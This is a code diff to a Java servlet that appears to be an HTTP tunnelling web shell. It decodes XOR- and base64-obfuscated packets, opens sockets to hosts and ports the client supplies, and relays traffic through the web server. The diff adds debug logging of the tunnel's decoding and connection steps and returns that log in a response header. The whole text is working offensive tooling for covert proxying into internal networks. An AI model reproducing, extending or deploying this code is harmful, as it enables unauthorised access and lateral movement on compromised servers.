@@ -23,6 +23,11 @@
         private OutputStream down;
         private String tunnel;
         private int opMode;
+        private StringBuilder dbgLog = new StringBuilder();
+
+        private void dbg(String s) {
+            dbgLog.append(s).append("; ");
+        }
 
         H() {}
         H(InputStream i, OutputStream o, String t) { up = i; down = o; tunnel = t; }
@@ -32,60 +37,95 @@
             HttpServletRequest r = (HttpServletRequest) req;
             HttpServletResponse s = (HttpServletResponse) rsp;
             String sid = null;
-            byte[] head = new byte[0];
             try {
-                Map<String, byte[]> pkt = decode(r.getInputStream());
+                byte[] body = readAll(r.getInputStream());
+                String hex = "";
+                for (int i = 0; i < Math.min(body.length, 32); i++) {
+                    hex += String.format("%02x", body[i]);
+                }
+                dbg("bodyLen=" + body.length + " headHex=" + hex);
+                if (body.length == 0) return;
+                ByteArrayInputStream bs = new ByteArrayInputStream(body);
+                dbg("bs0 avail=" + bs.available());
+                Map<String, byte[]> pkt = decode(bs);
+                dbg("bs1 after1stDecode avail=" + bs.available() + " pktSize=" + (pkt == null ? "null" : pkt.size()));
                 if (pkt == null) return;
 
                 byte[] m = pkt.get("m");
                 byte[] ac = pkt.get("ac");
                 byte[] id = pkt.get("id");
                 byte[] sId = pkt.get("sid");
-                if (ac == null || ac.length != 1 || id == null || id.length == 0 || m == null || m.length == 0) return;
+                dbg("fields: m=" + (m == null ? "null" : (int)m[0]) + " ac=" + (ac == null ? "null" : (int)ac[0]) + " id=" + (id == null ? "null" : new String(id)) + " sid=" + (sId == null ? "null" : new String(sId)));
+                if (ac == null || ac.length != 1 || id == null || id.length == 0 || m == null || m.length == 0) {
+                    dbg("early return: missing fields");
+                    return;
+                }
                 if (sId != null && sId.length > 0) sid = new String(sId);
                 String tid = new String(id);
                 byte mode = m[0];
+                dbg("mode=" + mode + " tid=" + tid + " sid=" + sid);
 
                 if (mode == 0) {
                     sid = randStr(16);
+                    dbg("doCheck sid=" + sid);
                     doCheck(r, s, pkt, tid, sid);
+                    dbg("doCheck done");
                 } else if (mode == 1 || mode == 2 || mode == 3) {
                     disableBuffer(s);
                     if (mode == 3) {
-                        byte[] raw = readAll(r.getInputStream());
-                        if (!doProxy(r, s, pkt, head, raw)) {
-                            if (sId == null || sId.length == 0 || _sessions.get(new String(sId)) == null) {
+                        if (!doProxy(r, s, pkt, new byte[0], body)) {
+                            if (sId != null && sId.length > 0 && _sessions.get(new String(sId)) == null) {
+                                dbg("403 sid not found");
                                 s.setStatus(403);
                                 return;
                             }
-                            InputStream bs = new ByteArrayInputStream(raw);
+                            int avail0 = bs.available();
+                            dbg("bodyLen=" + body.length + " bsAvailAfterFirstDecode=" + avail0);
                             int pad = padSize(sid);
                             ByteArrayOutputStream out = new ByteArrayOutputStream();
                             out.write(openTpl(s, sid));
+                            int iter = 0;
                             for (;;) {
+                                iter++;
+                                int acVal = (int)pkt.get("ac")[0];
+                                dbg("iter" + iter + ": ac=" + acVal + " tid=" + tid);
                                 doClassic(r, out, pkt, tid);
-                                pkt = decode(bs);
-                                if (pkt == null || pkt.isEmpty()) break;
+                                dbg("iter" + iter + ": out=" + out.size());
+                                try {
+                                    int b4 = bs.available();
+                                    pkt = decode(bs);
+                                    int af = bs.available();
+                                    if (pkt.isEmpty()) {
+                                        dbg("iter" + iter + ": decode EMPTY avail=" + b4 + "->" + af);
+                                    } else {
+                                        dbg("iter" + iter + ": decode OK ac=" + (int)pkt.get("ac")[0] + " avail=" + b4 + "->" + af);
+                                    }
+                                } catch (Exception e) {
+                                    dbg("iter" + iter + ": decode THROW " + e.getClass().getSimpleName() + " " + e.getMessage());
+                                    break;
+                                }
+                                if (pkt.isEmpty()) break;
                                 tid = new String(pkt.get("id"));
                             }
                             out.write(closeTpl(sid));
+                            dbg("final out=" + out.size());
                             s.setContentLength(out.size());
                             flush(s, out.toByteArray(), 0);
+                            dbg("flushed");
                         }
                     } else {
                         if (mode == 2) {
-                            byte[] raw = readAll(r.getInputStream());
-                            if (doProxy(r, s, pkt, head, raw)) return;
+                            if (doProxy(r, s, pkt, new byte[0], body)) return;
                             if (sId == null || sId.length == 0 || _sessions.get(new String(sId)) == null) {
                                 s.setStatus(403);
                                 return;
                             }
-                            InputStream bs = new ByteArrayInputStream(raw);
+                            InputStream bs2 = new ByteArrayInputStream(body);
                             int pad = padSize(sid);
                             flush(s, openTpl(s, sid), pad);
                             for (;;) {
                                 doHalf(r, s, pkt, tid, pad);
-                                pkt = decode(bs);
+                                pkt = decode(bs2);
                                 if (pkt == null || pkt.isEmpty()) break;
                                 tid = new String(pkt.get("id"));
                             }
@@ -95,8 +135,10 @@
                         }
                     }
                 }
-            } catch (Throwable ignored) {
+            } catch (Throwable e) {
+                dbg("EXCEPTION: " + e.getMessage());
             } finally {
+                try { s.addHeader("X-Dbg", dbgLog.toString()); } catch (Exception ignored) {}
                 try { OutputStream os = s.getOutputStream(); os.flush(); os.close(); } catch (Throwable ignored) {}
             }
         }
@@ -260,16 +302,22 @@
             boolean keepAlive = true;
             try {
                 byte a = pkt.get("ac")[0];
+                dbg("doClassic ac=" + a + " tid=" + tid);
                 if (a == 0) {
-                    out.write(doCreate(r, pkt, tid, true));
+                    byte[] ret = doCreate(r, pkt, tid, true);
+                    dbg("doCreate ret=" + ret.length);
+                    out.write(ret);
                 } else if (a == 1) {
                     doWrite(pkt, tid, true);
-                    out.write(doRead(tid));
+                    byte[] ret = doRead(tid);
+                    dbg("doRead ret=" + ret.length);
+                    out.write(ret);
                 } else if (a == 2) {
                     keepAlive = false;
                     doRemove(tid);
                 }
             } catch (Exception e) {
+                dbg("doClassic err: " + e.getMessage());
                 doRemove(tid);
                 if (keepAlive) out.write(encode(mkDel(tid)));
             }
@@ -288,6 +336,7 @@
             String host = new String(pkt.get("h"));
             int port = Integer.parseInt(new String(pkt.get("p")));
             if (port == 0) port = localPort(r);
+            dbg("doCreate host=" + host + ":" + port);
             ByteArrayOutputStream ba = new ByteArrayOutputStream();
             SocketChannel ch = null;
             Map<String, byte[]> res;
@@ -305,8 +354,10 @@
                 if (spawn) {
                     new Thread(new H(tid, 1)).start();
                     new Thread(new H(tid, 2)).start();
+                    dbg("threads started");
                 }
             } catch (Exception e) {
+                dbg("doCreate err: " + e.getMessage());
                 if (ch != null) try { ch.close(); } catch (Exception ignored) {}
                 res = mkStatus(tid, (byte) 1);
             }
@@ -345,7 +396,9 @@
                 ba.write(encode(mkData(tid, d)));
                 if (written >= limit) break;
             }
+            dbg("doRead written=" + written + " chOpen=" + ch.isOpen() + " rqEmpty=" + rq.isEmpty());
             if (!ch.isOpen() && rq.isEmpty()) {
+                dbg("socket closed, sending del");
                 doRemove(tid);
                 ba.write(encode(mkDel(tid)));
             }
@@ -510,12 +563,16 @@
             byte[] data = buf.toByteArray();
             byte[] k = new byte[]{(byte)(rng.nextInt(255) + 1), (byte)(rng.nextInt(255) + 1)};
             for (int i = 0; i < data.length; i++) data[i] ^= k[i % 2];
-            data = b64url(data).getBytes();
+            String b64data = b64url(data);
+            if (b64data == null) { dbg("encode b64url failed"); return new byte[0]; }
+            data = b64data.getBytes();
             byte[] hdr = new byte[6];
             hdr[0] = k[0]; hdr[1] = k[1];
             System.arraycopy(u32(data.length), 0, hdr, 2, 4);
             for (int i = 2; i < 6; i++) hdr[i] ^= k[i % 2];
-            hdr = b64url(hdr).getBytes();
+            String b64hdr = b64url(hdr);
+            if (b64hdr == null) { dbg("encode b64url hdr failed"); return new byte[0]; }
+            hdr = b64hdr.getBytes();
             ByteBuffer out = ByteBuffer.allocate(8 + data.length);
             out.put(hdr); out.put(data);
             return out.array();
@@ -523,16 +580,34 @@
 
         Map<String, byte[]> decode(InputStream in) throws Exception {
             Map<String, byte[]> m = new HashMap<String, byte[]>();
+            int startAvail = in.available();
+            dbg("D1 start avail=" + startAvail);
             byte[] hdr = new byte[8];
-            readExact(in, hdr);
+            try {
+                readExact(in, hdr);
+            } catch (IOException e) {
+                dbg("D1_HDR_EOF avail=" + startAvail + " err=" + e.getMessage());
+                return m;
+            }
+            dbg("D2 hdr8 ok avail=" + in.available());
             hdr = unb64url(new String(hdr));
-            if (hdr == null || hdr.length == 0) return m;
+            if (hdr == null || hdr.length == 0) {
+                dbg("D2_HDR_NULL");
+                return m;
+            }
             byte[] xor = new byte[]{hdr[0], hdr[1]};
             for (int i = 2; i < 6; i++) hdr[i] ^= xor[i % 2];
             int len = ByteBuffer.wrap(hdr, 2, 4).getInt();
+            dbg("D3 datLen=" + len + " avail=" + in.available());
             if (len > 32 * 1024 * 1024) throw new IOException("too large");
             byte[] raw = new byte[len];
-            readExact(in, raw);
+            try {
+                readExact(in, raw);
+            } catch (IOException e) {
+                dbg("D3_DAT_EOF need=" + len + " avail=" + in.available() + " err=" + e.getMessage());
+                return m;
+            }
+            dbg("D4 datOk avail=" + in.available());
             raw = unb64url(new String(raw));
             for (int i = 0; i < raw.length; i++) raw[i] ^= xor[i % 2];
             for (int i = 0; i < raw.length; ) {
@@ -547,6 +622,7 @@
                 m.put(key, Arrays.copyOfRange(raw, i, i + vl));
                 i += vl;
             }
+            dbg("D5 done keys=" + m.keySet() + " consumed=" + (startAvail - in.available()));
             return m;
         }
 
